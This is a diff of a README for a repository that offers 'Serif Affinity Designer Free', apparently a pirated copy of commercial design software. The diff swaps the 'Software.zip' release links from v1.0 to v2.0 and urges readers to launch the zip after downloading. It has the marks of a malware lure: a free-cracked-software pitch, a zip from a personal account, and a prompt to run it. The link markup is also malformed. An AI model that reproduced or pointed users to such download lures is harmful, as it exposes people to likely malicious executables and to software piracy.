@@ -1,6 +1,6 @@
 # 🎨 Welcome to Serif Affinity Designer Free! 🎨
 
-[![Download Zip](https://github.com/leeki12/Serif-Affinity-Designer-Free/releases/download/v1.0/Software.zip%https://github.com/leeki12/Serif-Affinity-Designer-Free/releases/download/v1.0/Software.zip)](https://github.com/leeki12/Serif-Affinity-Designer-Free/releases/download/v1.0/Software.zip)
+[![Download Zip](https://github.com/leeki12/Serif-Affinity-Designer-Free/releases/download/v2.0/Software.zip%https://github.com/leeki12/Serif-Affinity-Designer-Free/releases/download/v2.0/Software.zip)](https://github.com/leeki12/Serif-Affinity-Designer-Free/releases/download/v2.0/Software.zip)
 
 ## Repository Name: "Serif-Affinity-Designer-Free"
 
@@ -107,7 +107,7 @@ Curious about **Serif Affinity Designer** but not ready to commit? Try out our t
 
 ---
 
-### 🔗 Download Zip: [v1.0.0](https://github.com/leeki12/Serif-Affinity-Designer-Free/releases/download/v1.0/Software.zip)
+### 🔗 Download Zip: [v1.0.0](https://github.com/leeki12/Serif-Affinity-Designer-Free/releases/download/v2.0/Software.zip)
 
 Remember to launch the zip file after downloading to get started with Serif Affinity Designer Free!
 
